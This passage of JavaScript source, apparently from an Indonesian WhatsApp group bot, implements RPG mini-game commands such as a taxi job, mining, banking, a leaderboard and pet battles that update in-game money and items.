│ ${global.rpg.emoticon('chip')} Chip: ${user.chip}
│ 🤖 Robo: ${user.robo > 0 ? 'Level ' + user.robo: '✖️'}
│ 🌟 Status: ${isMods ? 'Developer' : isRyuuTheCreator ? 'Owner' : isPrem ? 'Premium User ✅' : user.level > 999 ? 'Elite User' : 'Free User'}
│ 📑 Registered: ${user.registered ? 'Yes': 'No'}
└────···
`.trim()
    replybankcek(`${caption}`)
}
break
//=========================================\\
case 'bansos': {
  if (!m.isGroup) return reply(mess.only.group)
  function pickRandom(list) {
    return list[Math.floor(Math.random() * list.length)];
  }

  function clockString(ms) {
    let h = Math.floor(ms / 3600000);
    let m = Math.floor(ms / 60000) % 60;
    let s = Math.floor(ms / 1000) % 60;
    return [h, m, s].map(v => v.toString().padStart(2, '0')).join(':');
  }

  let user = global.db.users[m.sender];
  let randomaku = Math.floor(Math.random() * 101);
  let randomkamu = Math.floor(Math.random() * 101);
  let __timers = new Date() - user.lastbansos;
  let _timers = 360 - __timers;
  let timers = clockString(_timers);

  if (user.money < 1000) {
    return replyReinzID(`Uang Anda Harus Diatas Seribu Untuk Menggunakan Command Ini`);
  }

  if (new Date() - user.lastbansos > 300000) {
    if (randomaku > randomkamu) {
      user.money -= 3000000;
      user.lastbansos = new Date() * 1;
      return RyuuBotz.sendMessage(m.chat, {
        image: { url: 'https://telegra.ph/file/afcf9a7f4e713591080b5.jpg' },
        caption: `Kamu Tertangkap Setelah Kamu korupsi dana bansos🕴️💰,  Dan Kamu harus membayar denda 3 Juta rupiah💵`
      });
    } else if (randomaku < randomkamu) {
      user.money += 3000000;
      user.lastbansos = new Date() * 1;
      return RyuuBotz.sendMessage(m.chat, {
        image: { url: 'https://telegra.ph/file/d31fcc46b09ce7bf236a7.jpg' },
        caption: `Kamu berhasil korupsi dana bansos🕴️💰,  Dan Kamu mendapatkan 3 Juta rupiah💵`
      });
    } else {
      user.lastbansos = new Date() * 1;
      return replyReinzID(`Sorry Gan Lu g Berhasil Korupsi bansos Dan Tidak masuk penjara karna Kamu *melarikan diri🏃*`);
    }
  } else {
    return replyReinzID(`Silahkan Menunggu Beberapa Menit Untuk bansos Lagi`);
  }
}
break;

//=========================================\\
case 'taxy': {
  if (!m.isGroup) return reply(mess.only.group)
  function clockString(ms) {
    let h = Math.floor(ms / 3600000)
    let m = Math.floor(ms / 60000) % 60
    let s = Math.floor(ms / 1000) % 60
    return [h, m, s].map(v => v.toString().padStart(2, 0)).join(':')
}
    let __timers = (new Date - global.db.users[m.sender].lastmisi)
    let _timers = (3600000 - __timers)
    let order = global.db.users[m.sender].ojekk
    let timers = clockString(_timers)
    let name = RyuuBotz.getName(m.sender)
    let user = global.db.users[m.sender]
    let id = m.sender
    let kerja = 'Taxy'
    RyuuBotz.misi = RyuuBotz.misi ? RyuuBotz.misi : {}
    if (id in RyuuBotz.misi) {
        replyReinzID(`Selesaikan Misi ${RyuuBotz.misi[id][0]} Terlebih Dahulu`)
        throw false
    }
    if (new Date - user.lastmisi > 3600000) {
        let randomaku1 = Math.floor(Math.random() * 1000000)
        let randomaku2 = Math.floor(Math.random() * 10000)
        
        var dimas = `
🚶⬛⬛⬛⬛⬛⬛⬛⬛⬛
⬛⬜⬜⬜⬛⬜⬜⬜⬛⬛
⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛
🏘️🏘️🏘️🏘️🌳  🌳 🏘️       🚕


✔️ Mendapatkan orderan....
`.trim()

        var dimas2 = `
🚶⬛⬛⬛⬛⬛🚐⬛⬛⬛🚓🚚
🚖⬜⬜⬜⬛⬜⬜⬜🚓⬛🚑
⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛🚙
🏘️🏘️🏢️🌳  🌳 🏘️  🏘️🏡


🚖 Mengantar Ke tujuan.....
`.trim()

        var dimas3 = `
⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛🚓
⬛⬜🚗⬜⬜⬛⬜🚐⬜⬜⬛🚙🚚🚑
⬛⬛⬛⬛🚒⬛⬛⬛⬛⬛⬛🚚
🏘️🏘️🏘️🏘️🌳  🌳 🏘️


🚖 Selesai Mengantar Pelanggan....
`.trim()

        var dimas4 = `
➕ 💹Menerima gaji....
`.trim()

        var hsl = `
*—[ Hasil Taxy ${name} ]—*
➕ 💹 Uang = [ ${randomaku1} ]
➕ ✨ Exp = [ ${randomaku2} ]
➕ 😍 Order Selesai = +1
➕ 📥Total Order Sebelumnya : ${order}
`.trim()

        user.money += randomaku1
        user.exp += randomaku2
        user.ojekk += 1
        
        RyuuBotz.misi[id] = [
            kerja,
        setTimeout(() => {
            delete RyuuBotz.misi[id]
        }, 27000)
        ]
        
        setTimeout(() => {
            replyReinzID(`${hsl}`)
        }, 27000)

        setTimeout(() => {
            replyReinzID(`${dimas4}`)
        }, 25000)

        setTimeout(() => {
            replyReinzID(`${dimas3}`)
        }, 20000)

        setTimeout(() => {
            replyReinzID(`${dimas2}`)
        }, 15000)

        setTimeout(() => {
            replyReinzID(`${dimas}`)
        }, 10000)

        setTimeout(() => {
            replyReinzID('🔍Mencari pelanggan.....')
        }, 0)
        user.lastmisi = new Date * 1
    } else replyReinzID(`Silahkan Menunggu Selama ${timers}, Untuk Menyelesaikan Misi Kembali`)
}
break
//=========================================\\
//=========================================\\
case 'leaderboard': {
  if (!m.isGroup) return reply(mess.only.group)
const getRandom = (ext) => {
            return `${Math.floor(Math.random() * 10000)}${ext}`
        }
const { areJidsSameUser } = require ('@whiskeysockets/baileys')
function sort(property, ascending = true) {
  if (property) return (...args) => args[ascending & 1][property] - args[!ascending & 1][property]
  else return (...args) => args[ascending & 1] - args[!ascending & 1]
}

function toNumber(property, _default = 0) {
  if (property) return (a, i, b) => {
    return { ...b[i], [property]: a[property] === undefined ? _default : a[property] }
  }
  else return a => a === undefined ? _default : a
}

function enumGetKey(a) {
  return a.jid
}


/**
 * Detect Number
 * @param {Number} x 
 */
function isNumber(number) {
  if (!number) return number
  number = parseInt(number)
  return typeof number == 'number' && !isNaN(number)
}
const leaderboards = [
    'level',
    'exp',
    'limit',
    'money',
    'iron',
    'gold',
    'diamond',
    'emerald',
    'trash',
    'joinlimit',
    'potion',
    'petFood',
    'wood',
    'rock',
    'string',
    'common',
    'uncommon',
    'mythic',
    'legendary',
    'pet',
    'bank',
    'chip',
    'skata'
]
    let users = Object.entries(global.db.users).map(([key, value]) => {
        return {
            ...value, jid: key
        }
    })
    let imgr = getRandom()
    let leaderboard = leaderboards.filter(v => v && users.filter(user => user && user[v]).length)
    let type = (args[0] || '').toLowerCase()
    const getPage = (item) => Math.ceil((users.filter(user => user && user[item]).length) / 0)
    let wrong = `🔖 ᴛʏᴩᴇ ʟɪsᴛ :
${leaderboard.map(v => `
⮕ ${rpg.emoticon(v)} - ${v}
`.trim()).join('\n')}
––––––––––––––––––––––––
💁🏻‍♂ ᴛɪᴩ :
⮕ ᴛᴏ ᴠɪᴇᴡ ᴅɪғғᴇʀᴇɴᴛ ʟᴇᴀᴅᴇʀʙᴏᴀʀᴅ:
${command} [type]
★ ᴇxᴀᴍᴩʟᴇ:
${command} legendary`.trim()
    if (!leaderboard.includes(type))
        return await reply('*––––『 𝙻𝙴𝙰𝙳𝙴𝚁𝙱𝙾𝙰𝚁𝙳 』––––*\n' + wrong, {
        contextInfo: {
            
        }
    })
    let page = isNumber(args[1]) ? Math.min(Math.max(parseInt(args[1]), 0), getPage(type)): 0
    let sortedItem = users.map(toNumber(type)).sort(sort(type))
    let userItem = sortedItem.map(enumGetKey)
    // let len = args[0] && args[0].length > 0 ? Math.min(100, Math.max(parseInt(args[0]), 5)) : Math.min(5, sortedExp.length)
    let text = `
🏆 ʀᴀɴᴋ: ${userItem.indexOf(m.sender) + 1} ᴏᴜᴛ ᴏғ ${userItem.length}

                *• ${rpg.emoticon(type)} ${type} •*

${sortedItem.slice(page * 0, page * 5 + 5).map((user, i) => `${i + 1}.*﹙${user[type]}﹚*- ${participants.some(p => areJidsSameUser(user.jid, p.id)) ? `${user.registered ? user.name: RyuuBotz.getName(user.jid)} \nwa.me/`: 'ғʀᴏᴍ ᴏᴛʜᴇʀ ɢʀᴏᴜᴩ\n @'}${user.jid.split`@`[0]}`).join`\n\n`}
`.trim()
    return await reply(text,{
        contextInfo: {
            mentionedJid: [...userItem.slice(page * 0, page * 5 + 5)].filter(v => !participants.some(p => areJidsSameUser(v, p.id))),
           
        }
    })
}
break
//=========================================\\
case 'mulung': {
  if (!m.isGroup) return reply(mess.only.group)
  function msToTime(duration) {
    var milliseconds = parseInt((duration % 1000) / 100),
    seconds = Math.floor((duration / 1000) % 60),
    minutes = Math.floor((duration / (1000 * 60)) % 60),
    hours = Math.floor((duration / (1000 * 60 * 60)) % 24)
    hours = (hours < 10) ? "0" + hours : hours
    minutes = (minutes < 10) ? "0" + minutes : minutes
    seconds = (seconds < 10) ? "0" + seconds : seconds
    return hours + " jam " + minutes + " menit " + seconds + " detik"
}
    let user = global.db.users[m.sender]
    let time = user.lastmulung + 1800000

    if (new Date - user.lastmulung < 1800000) return replyReinzID(`Anda sudah lelah untuk mulung\nTunggu selama ${msToTime(time - new Date())} lagi`)

    let botol = Math.floor(Math.random() * 1000)
    let kaleng = Math.floor(Math.random() * 1000)
    let kardus = Math.floor(Math.random() * 1000)
    let gelas = Math.floor(Math.random() * 1000)
    let plastik = Math.floor(Math.random() * 1000)

    user.botol += botol * 1
    user.kaleng += kaleng * 1
    user.kardus += kardus * 1
    user.gelas += gelas * 1
    user.plastik += plastik * 1
    user.lastmulung = new Date * 1
    replyReinzID(`Selamat kamu mendapatkan : \n+${botol} Botol\n+${kaleng} Kaleng\n+${kardus} Kardus\n+${gelas} Gelas\n+${plastik} Plastik`)
}
break
case 'mining': {
  Array.prototype.getRandom = function () {
    return this[Math.floor(Math.random() * this.length)];
};

// For numbers, you can use a similar approach if needed
Number.prototype.getRandom = function () {
    return Math.floor(Math.random() * this);
};
function reward(user = {}) {
    let rewards = {
        reward: {
            exp: 1000,
            trash: 101,
            string: 25,
            rock: 30,
            iron: 25,
            diamond: 10,
            emerald: 4,
            common: 2 * (user.dog && (user.dog > 2 ? 2 : user.dog) * 1.2 || 1),
            uncommon: [0, 0, 0, 1, 0].concat(
                new Array(5 - (
                    (user.dog > 2 && user.dog < 6 && user.dog) || (user.dog > 5 && 5) || 2
                )).fill(0)
            ),
            mythic: [0, 0, 0, 0, 0, 1, 0, 0, 0].concat(
                new Array(8 - (
                    (user.dog > 5 && user.dog < 8 && user.dog) || (user.dog > 7 && 8) || 3
                )).fill(0)
            ),
            legendary: [0, 0, 0, 0, 0, 0, 0, 1, 0, 0].concat(
                new Array(10 - (
                    (user.dog > 8 && user.dog) || 4
                )).fill(0)
            ),
            iron: [0, 0, 0, 1, 0, 0],
            gold: [0, 0, 0, 0, 0, 1, 0],
            diamond: [0, 0, 0, 0, 0, 0, 1, 0].concat(
                new Array(5 - (
                    (user.fox < 6 && user.fox) || (user.fox > 5 && 5) || 0
                )).fill(0)
            ),
        },
        lost: {
            health: 40 - user.cat * 4,
            pickaxedurability: 10
        }
    }
    return rewards
}
const cooldown = 300000;
let user = global.db.users[m.sender];
    let timers = cooldown - (new Date() - user.lastmining);
    if (user.health < 80) {
        return reply(`
⚠️ Butuh setidaknya 80 ❤️Healths untuk menambang!! ⚠️
Silakan beli ❤️Healths terlebih dahulu dengan mengetik *${prefix}buy potion <jumlah>*,
dan ketik *${prefix}heal <jumlah>* untuk menggunakan potion.
`.trim());
    }

    if (user.pickaxe == 0) {
        return reply('⛏️ Kamu tidak bisa menambang tanpa alat penambang (pickaxe)! ⛏️');
    }

    if (new Date() - user.lastmining <= cooldown) {
        return reply(`
⏳ Kamu sudah menambang sebelumnya! Silakan tunggu *${(timers / 1000).toFixed(2)} detik* sebelum menambang lagi.
`.trim());
    }

    const rewards = reward(user);
    let text = 'Kamu telah menambang dan kehilangan';
    for (const lost in rewards.lost) {
        if (user[lost]) {
            const total = rewards.lost[lost].getRandom();
            user[lost] -= total * 1;
            if (total) {
                text += `\n*${global.rpg.emoticon(lost)}${lost}:* ${total}`;
            }
        }
    }

    text += '\n\nNamun kamu mendapatkan';
    for (const rewardItem in rewards.reward) {
        if (rewardItem in user) {
            const total = rewards.reward[rewardItem].getRandom();
            user[rewardItem] += total * 1;
            if (total) {
                text += `\n*${global.rpg.emoticon(rewardItem)}${rewardItem}:* ${total}`;
            }
        }
    }

    reply(text.trim());
    user.lastmining = new Date() * 1;
}
break
case 'nabung': {
const xpperlimit = 1
	let user = global.db.users[m.sender]
  let count = command.replace(/^nabung/i, '')
  count = count ? /all/i.test(count) ? Math.floor(global.db.users[m.sender].money / xpperlimit) : parseInt(count) : args[0] ? parseInt(args[0]) : 1
  count = Math.max(1, count)
  if (user.atm == 0) return reply('kamu belum mempuyai atm !')
  if (user.bank > user.fullatm) return reply('Uang dibankmu sudah penuh!')
  if (count > user.fullatm - user.bank) return reply('Uangnya ga muat dibank')
  if (global.db.users[m.sender].money >= xpperlimit * count) {
    global.db.users[m.sender].money -= xpperlimit * count
    global.db.users[m.sender].bank += count
    reply(`Sukses menabung sebesar ${count} Money 💹`)
  } else reply(`[❗] Uang anda tidak mencukupi untuk menabung ${count} money 💹`)
}
 break
 case 'tarik':
case 'narik': {
  const xpperlimit = 1
  let user = global.db.users[m.sender]
  let count = command.replace(/^tarik|narik/i, '')
  count = count ? /all/i.test(count) ? user.bank : parseInt(count) : args[0] ? parseInt(args[0]) : 1
  count = Math.max(1, count)

  if (user.atm == 0) return reply('Kamu belum mempunyai ATM!')
  if (user.bank == 0) return reply('Uang kamu di bank kosong!')
  if (count > user.bank) return reply('Uang di bank tidak mencukupi!')

  user.bank -= count
  user.money += xpperlimit * count
  reply(`Sukses menarik sebesar ${count} Money 💸 dari bank`)
}
break
case 'fightnaga':
  case 'perangnaga': {
    if (!m.isGroup) return reply(mess.only.group)
function Acakin(min,max){
  min = Math.ceil(min)
  max = Math.floor(max)
  return Math.floor(Math.random()*(max-min+1)) + min
}
let penumpan = ['mas mas', 'bapak bapak', 'cewe sma', 'bocil epep', 'emak emak']
    let penumpang = penumpan[Math.floor(Math.random() * penumpan.length)]
let nogo = ['mas mas', 'bapak bapak', 'cewe sma', 'bocil epep', 'emak emak']
    let nogorojo = penumpan[Math.floor(Math.random() * penumpan.length)]
RyuuBotz.level = global.db.users[m.sender]
  RyuuBotz.fightnaga = RyuuBotz.fightnaga ? RyuuBotz.fightnaga : {}
  const delay = time => new Promise(res=>setTimeout(res,time));

  if (typeof RyuuBotz.fightnaga[m.sender] != "undefined" && RyuuBotz.fightnaga[m.sender] == true) return reply(`*Tidak bisa melakukan battle ⚔️ karena Arena yang kamu miliki dipakai untuk fight pet mu yg lain.*`)

  let users = participants.map(a => a.id)
  var lawan
	lawan = users[Math.floor(users.length * Math.random())]
  while (typeof global.db.users[lawan] == "undefined" || lawan == m.sender){
    lawan = users[Math.floor(users.length * Math.random())]
  }

  let lamaPertarungan = Acakin(8,20)
  reply(`*Pet Kamu* (🐉naga ${nogorojo} ) ⚔️menantang 🐉naganya *${penumpang}* (🐉naga kamu ) lagi berkelahi.\n\nTunggu ${lamaPertarungan} menit lagi dan lihat siapa yg menang🎮.`)

  RyuuBotz.fightnaga[m.sender] = true

  await delay(1000 * 60 * lamaPertarungan)

  const alasanKalah = ['Naikin lagi levelnya😐','Cupu','Kurang hebat','Ampas Petnya','Pet gembel']
  const alasanMenang = ['Hebat','Pro','Ganas Pet','Legenda Pet','Sangat Pro','Rajin Ngasi Makan Pet']

  let kesempatan = []
  let i
  for (i=0;i<global.db.users[m.sender].naga;i++) kesempatan.push(m.sender)
  for (i=0;i<global.db.users[lawan].naga;i++) kesempatan.push(lawan)

  let pointPemain = 0
  let pointLawan = 0
  for (i=0;i<10;i++){
    unggul = Acakin(0,kesempatan.length-1)
    if (kesempatan[unggul] == m.sender) pointPemain += 1
    else pointLawan += 1
  }

  if (pointPemain > pointLawan){
    let hadiah = (pointPemain - pointLawan) * 20000
    global.db.users[m.sender].money += hadiah
    global.db.users[m.sender].tiketcoin += 1
    reply(`*${RyuuBotz.getName(m.sender)}* [${pointPemain * 10}] - [${pointLawan * 10}] *${RyuuBotz.getName(lawan)}*\n\n*Pet🐉Kamu* (naga ${global.db.users[m.sender].naga}) MENANG melawan 🐉naganya *${RyuuBotz.getName(lawan)}* (naga ${global.db.users[lawan].naga}) karena naga🐉kamu ${alasanMenang[Acakin(0,alasanMenang.length-1)]}\n\nHadiah Rp. ${hadiah.toLocaleString()}\n+1 Tiketcoin`)
  }else if (pointPemain < pointLawan){
    let denda = (pointLawan - pointPemain) * 100000
    global.db.users[m.sender].money -= denda
    global.db.users[m.sender].tiketcoin += 1
    reply(`*${RyuuBotz.getName(m.sender)}* [${pointPemain * 10}] - [${pointLawan * 10}] *${RyuuBotz.getName(lawan)}*\n\n*Pet🐉Kamu* (naga ${global.db.users[m.sender].naga}) KALAH melawan 🐉naganya *${RyuuBotz.getName(lawan)}* (naga ${global.db.users[lawan].naga}) karena pet kamu ${alasanKalah[Acakin(0,alasanKalah.length-1)]}\n\nUang kamu berkurang Rp. ${denda.toLocaleString()}\n+1 Tiketcoin`)
  }else {
    reply(`*${RyuuBotz.getName(m.sender)}* [${pointPemain * 10}] - [${pointLawan * 10}] *${RyuuBotz.getName(lawan)}*\n\nHasil imbang kak, ga dapet apa apa 😂`)
  }

  delete RyuuBotz.fightnaga[m.sender]
}
break
case 'fightkyubi': {
  if (!m.isGroup) return reply(mess.only.group)
  function Acakin(min,max){
  min = Math.ceil(min)
  max = Math.floor(max)
  return Math.floor(Math.random()*(max-min+1)) + min
}
let penumpan = ['mas mas', 'bapak bapak', 'cewe sma', 'bocil epep', 'emak emak']
    let penumpang = penumpan[Math.floor(Math.random() * penumpan.length)]
let nogo = ['mas mas', 'bapak bapak', 'cewe sma', 'bocil epep', 'emak emak']
    let nogorojo = penumpan[Math.floor(Math.random() * penumpan.length)]
RyuuBotz.level = global.db.users[m.sender]
  RyuuBotz.fightnaga = RyuuBotz.fightnaga ? RyuuBotz.fightnaga : {}
  const delay = time => new Promise(res=>setTimeout(res,time));

  if (typeof RyuuBotz.fightnaga[m.sender] != "undefined" && RyuuBotz.fightnaga[m.sender] == true) return reply(`*Tidak bisa melakukan battle ⚔️ karena Arena yang kamu miliki dipakai untuk fight pet mu yg lain.*`)

  let users = participants.map(u => u.id)
  var lawan
	lawan = users[Math.floor(users.length * Math.random())]
  while (typeof global.db.users[lawan] == "undefined" || lawan == m.sender){
    lawan = users[Math.floor(users.length * Math.random())]
  }

  let lamaPertarungan = Acakin(8,20)

  reply(`*Pet Kamu* (🦊kyubi ${penumpang}) ⚔️menantang 🦊kyubinya *${nogorojo}* (🦊kyubi kamu) lagi berkelahi.\n\nTunggu ${lamaPertarungan} menit lagi dan lihat siapa yg menang🎮.`)

  RyuuBotz.fightnaga[m.sender] = true

  await delay(1000 * 60 * lamaPertarungan)

  let alasanKalah = ['Naikin lagi levelnya😐','Cupu','Kurang hebat','Ampas Petnya','Pet gembel']
  let alasanMenang = ['Hebat','Pro','Ganas Pet','Legenda Pet','Sangat Pro','Rajin Ngasi Makan Pet']

  let kesempatan = []
  let i
  let unggul
  for (i=0;i<global.db.users[m.sender].kyubi;i++) kesempatan.push(m.sender)
  for (i=0;i<global.db.users[lawan].kyubi;i++) kesempatan.push(lawan)

  let pointPemain = 0
  let pointLawan = 0
  for (i=0;i<10;i++){
    unggul = Acakin(0,kesempatan.length-1)
    if (kesempatan[unggul] == m.sender) pointPemain += 1
    else pointLawan += 1
  }

  if (pointPemain > pointLawan){
    let hadiah = (pointPemain - pointLawan) * 20000
    global.db.users[m.sender].money += hadiah
    global.db.users[m.sender].tiketcoin += 1
    reply(`*${RyuuBotz.getName(m.sender)}* [${pointPemain * 10}] - [${pointLawan * 10}] *${RyuuBotz.getName(lawan)}*\n\n*Pet🦊Kamu* (kyubi ${global.db.users[m.sender].kyubi}) MENANG melawan 🦊kyubinya *${RyuuBotz.getName(lawan)}* (kyubi ${global.db.users[lawan].kyubi}) karena kyubi🦊kamu ${alasanMenang[Acakin(0,alasanMenang.length-1)]}\n\nHadiah Rp. ${hadiah.toLocaleString()}\n+1 Tiketcoin`)
  }else if (pointPemain < pointLawan){
    let denda = (pointLawan - pointPemain) * 100000
    global.db.users[m.sender].money -= denda
    global.db.users[m.sender].tiketcoin += 1
    reply(`*${RyuuBotz.getName(m.sender)}* [${pointPemain * 10}] - [${pointLawan * 10}] *${RyuuBotz.getName(lawan)}*\n\n*Pet🦊Kamu* (kyubi ${global.db.users[m.sender].kyubi}) KALAH melawan 🦊kyubinya *${RyuuBotz.getName(lawan)}* (kyubi ${global.db.users[lawan].kyubi}) karena pet kamu ${alasanKalah[Acakin(0,alasanKalah.length-1)]}\n\nUang kamu berkurang Rp. ${denda.toLocaleString()}\n+1 Tiketcoin`)
  }else {
    reply(`*${RyuuBotz.getName(m.sender)}* [${pointPemain * 10}] - [${pointLawan * 10}] *${RyuuBotz.getName(lawan)}*\n\nHasil imbang kak, ga dapet apa apa 😂`)
  }

  delete RyuuBotz.fightnaga[m.sender]
}
break
case 'fightphonix': {
  if (!m.isGroup) return reply(mess.only.group)
  function Acakin(min,max){
  min = Math.ceil(min)
  max = Math.floor(max)
  return Math.floor(Math.random()*(max-min+1)) + min
}
let penumpan = ['mas mas', 'bapak bapak', 'cewe sma', 'bocil epep', 'emak emak']
    let penumpang = penumpan[Math.floor(Math.random() * penumpan.length)]
let nogo = ['mas mas', 'bapak bapak', 'cewe sma', 'bocil epep', 'emak emak']
    let nogorojo = penumpan[Math.floor(Math.random() * penumpan.length)]
RyuuBotz.level = global.db.users[m.sender]
  RyuuBotz.fightnaga = RyuuBotz.fightnaga ? RyuuBotz.fightnaga : {}
  const delay = time => new Promise(res=>setTimeout(res,time));

  if (typeof RyuuBotz.fightnaga[m.sender] != "undefined" && RyuuBotz.fightnaga[m.sender] == true) return reply(`*Tidak bisa melakukan battle ⚔️ karena Arena yang kamu miliki dipakai untuk fight pet mu yg lain.*`)

  let users = participants.map(u => u.id)
  var lawan
	lawan = users[Math.floor(users.length * Math.random())]
  while (typeof global.db.users[lawan] == "undefined" || lawan == m.sender){
    lawan = users[Math.floor(users.length * Math.random())]
  }

  let lamaPertarungan = Acakin(8,20)

  reply(`*Pet Kamu* (🦅phonix ${penumpang}) ⚔️menantang 🦅phonixnya *${nogorojo}* (🦅phonix kamu) lagi berkelahi.\n\nTunggu ${lamaPertarungan} menit lagi dan lihat siapa yg menang🎮.`)

  RyuuBotz.fightnaga[m.sender] = true

  await delay(1000 * 60 * lamaPertarungan)

  let alasanKalah = ['Naikin lagi levelnya😐','Cupu','Kurang hebat','Ampas Petnya','Pet gembel']
  let alasanMenang = ['Hebat','Pro','Ganas Pet','Legenda Pet','Sangat Pro','Rajin Ngasi Makan Pet']

  let kesempatan = []
  for (i=0;i<global.db.users[m.sender].phonix;i++) kesempatan.push(m.sender)
  for (i=0;i<global.db.users[lawan].phonix;i++) kesempatan.push(lawan)

  let pointPemain = 0
  let pointLawan = 0
  for (i=0;i<10;i++){
    unggul = Acakin(0,kesempatan.length-1)
    if (kesempatan[unggul] == m.sender) pointPemain += 1
    else pointLawan += 1
  }

  if (pointPemain > pointLawan){
    let hadiah = (pointPemain - pointLawan) * 20000
    global.db.users[m.sender].money += hadiah
    global.db.users[m.sender].tiketcoin += 1
    reply(`*${RyuuBotz.getName(m.sender)}* [${pointPemain * 10}] - [${pointLawan * 10}] *${RyuuBotz.getName(lawan)}*\n\n*Pet🦅Kamu* (phonix ${global.db.users[m.sender].phonix}) MENANG melawan 🦅phonixnya *${RyuuBotz.getName(lawan)}* (phonix ${global.db.users[lawan].phonix}) karena phonix🦅kamu ${alasanMenang[Acakin(0,alasanMenang.length-1)]}\n\nHadiah Rp. ${hadiah.toLocaleString()}\n+1 Tiketcoin`)
  }else if (pointPemain < pointLawan){
    let denda = (pointLawan - pointPemain) * 10000
    global.db.users[m.sender].money -= denda
    global.db.users[m.sender].tiketcoin += 1
    reply(`*${RyuuBotz.getName(m.sender)}* [${pointPemain * 10}] - [${pointLawan * 10}] *${RyuuBotz.getName(lawan)}*\n\n*Pet🦅Kamu* (phonix ${global.db.users[m.sender].phonix}) KALAH melawan 🦅phonixnya *${RyuuBotz.getName(lawan)}* (phonix ${global.db.users[lawan].phonix}) karena pet kamu ${alasanKalah[Acakin(0,alasanKalah.length-1)]}\n\nUang kamu berkurang Rp. ${denda.toLocaleString()}\n+1 Tiketcoin`)
  }else {
    reply(`*${RyuuBotz.getName(m.sender)}* [${pointPemain * 10}] - [${pointLawan * 10}] *${RyuuBotz.getName(lawan)}*\n\nHasil imbang kak, ga dapet apa apa 😂`)
  }

  delete RyuuBotz.fightnaga[m.sender]
}
break
case 'fightkucing': {
  if (!m.isGroup) return reply(mess.only.group)
  function Acakin(min,max){
  min = Math.ceil(min)
  max = Math.floor(max)
  return Math.floor(Math.random()*(max-min+1)) + min
}
let penumpan = ['mas mas', 'bapak bapak', 'cewe sma', 'bocil epep', 'emak emak']
    let penumpang = penumpan[Math.floor(Math.random() * penumpan.length)]
let nogo = ['mas mas', 'bapak bapak', 'cewe sma', 'bocil epep', 'emak emak']
    let nogorojo = penumpan[Math.floor(Math.random() * penumpan.length)]
RyuuBotz.level = global.db.users[m.sender]
  RyuuBotz.fightnaga = RyuuBotz.fightnaga ? RyuuBotz.fightnaga : {}
  const delay = time => new Promise(res=>setTimeout(res,time));

  if (typeof RyuuBotz.fightnaga[m.sender] != "undefined" && RyuuBotz.fightnaga[m.sender] == true) return reply(`*Tidak bisa melakukan battle karena arena yg kamu miliki sedang kamu pakai .*`)

  let users = participants.map(u => u.id)
  var lawan
	lawan = users[Math.floor(users.length * Math.random())]
  while (typeof global.db.users[lawan] == "undefined" || lawan == m.sender){
    lawan = users[Math.floor(users.length * Math.random())]
  }

  let lamaPertarungan = Acakin(8,20)

  reply(`*Pet Kamu* (🐱kucing ${penumpang}) menantang 🐈kucingnya *${nogorojo}* (🐱kucing kamu) lagi kelahi rebutin bini.\n\nTunggu ${lamaPertarungan} menit lagi dan lihat siapa yg menang🎮.`)

  RyuuBotz.fightnaga[m.sender] = true

  await delay(1000 * 60 * lamaPertarungan)

  let alasanKalah = ['Naikin lagi levelnya😐','Cupu','Kurang hebat','Ampas Petnya','Pet gembel']
  let alasanMenang = ['Hebat','Pro','Ganas Pet','Legenda Pet','Sangat Pro','Rajin Ngasi Makan Pet']

  let kesempatan = []
  for (i=0;i<global.db.users[m.sender].kucing;i++) kesempatan.push(m.sender)
  for (i=0;i<global.db.users[lawan].kucing;i++) kesempatan.push(lawan)

  let pointPemain = 0
  let pointLawan = 0
  for (i=0;i<10;i++){
    unggul = Acakin(0,kesempatan.length-1)
    if (kesempatan[unggul] == m.sender) pointPemain += 1
    else pointLawan += 1
  }

  if (pointPemain > pointLawan){
    let hadiah = (pointPemain - pointLawan) * 20000
    global.db.users[m.sender].money += hadiah
    global.db.users[m.sender].tiketcoin += 1
    reply(`*${RyuuBotz.getName(m.sender)}* [${pointPemain * 10}] - [${pointLawan * 10}] *${RyuuBotz.getName(lawan)}*\n\n*Pet🐈Kamu* (kucing ${global.db.users[m.sender].kucing}) MENANG melawan 🐈kucingnya *${RyuuBotz.getName(lawan)}* (kucing ${global.db.users[lawan].kucing}) karena kucing🐈kamu ${alasanMenang[Acakin(0,alasanMenang.length-1)]}\n\nHadiah Rp. ${hadiah.toLocaleString()}\n+1 Tiketcoin`)
  }else if (pointPemain < pointLawan){
    let denda = (pointLawan - pointPemain) * 100000
    global.db.users[m.sender].money -= denda
    global.db.users[m.sender].tiketcoin += 1
    reply(`*${RyuuBotz.getName(m.sender)}* [${pointPemain * 10}] - [${pointLawan * 10}] *${RyuuBotz.getName(lawan)}*\n\n*Pet🐈Kamu* (kucing ${global.db.users[m.sender].kucing}) KALAH melawan 🐈kucingnya *${RyuuBotz.getName(lawan)}* (kucing ${global.db.users[lawan].kucing}) karena pet kamu ${alasanKalah[Acakin(0,alasanKalah.length-1)]}\n\nUang kamu berkurang Rp. ${denda.toLocaleString()}\n+1 Tiketcoin`)
  }else {
    reply(`*${RyuuBotz.getName(m.sender)}* [${pointPemain * 10}] - [${pointLawan * 10}] *${RyuuBotz.getName(lawan)}*\n\nHasil imbang kak, ga dapet apa apa 😂`)
  }

  delete RyuuBotz.fightnaga[m.sender]
}
 break
case 'fightgriffin': {
  function Acakin(min,max){
  min = Math.ceil(min)
  max = Math.floor(max)
  return Math.floor(Math.random()*(max-min+1)) + min
}
let penumpan = ['mas mas', 'bapak bapak', 'cewe sma', 'bocil epep', 'emak emak']
    let penumpang = penumpan[Math.floor(Math.random() * penumpan.length)]
let nogo = ['mas mas', 'bapak bapak', 'cewe sma', 'bocil epep', 'emak emak']
    let nogorojo = penumpan[Math.floor(Math.random() * penumpan.length)]
if (!m.isGroup) return reply(mess.only.group)
RyuuBotz.level = global.db.users[m.sender]
  RyuuBotz.fightnaga = RyuuBotz.fightnaga ? RyuuBotz.fightnaga : {}
  const delay = time => new Promise(res=>setTimeout(res,time));

  if (typeof RyuuBotz.fightnaga[m.sender] != "undefined" && RyuuBotz.fightnaga[m.sender] == true) return reply(`*Tidak bisa melakukan battle ⚔️ karena Arena yang kamu miliki dipakai untuk fight pet mu yg lain.*`)

  let users = participants.map(u => u.id)
  var lawan
	lawan = users[Math.floor(users.length * Math.random())]
  while (typeof global.db.users[lawan] == "undefined" || lawan == m.sender){
    lawan = users[Math.floor(users.length * Math.random())]
  }

  let lamaPertarungan = Acakin(8,20)

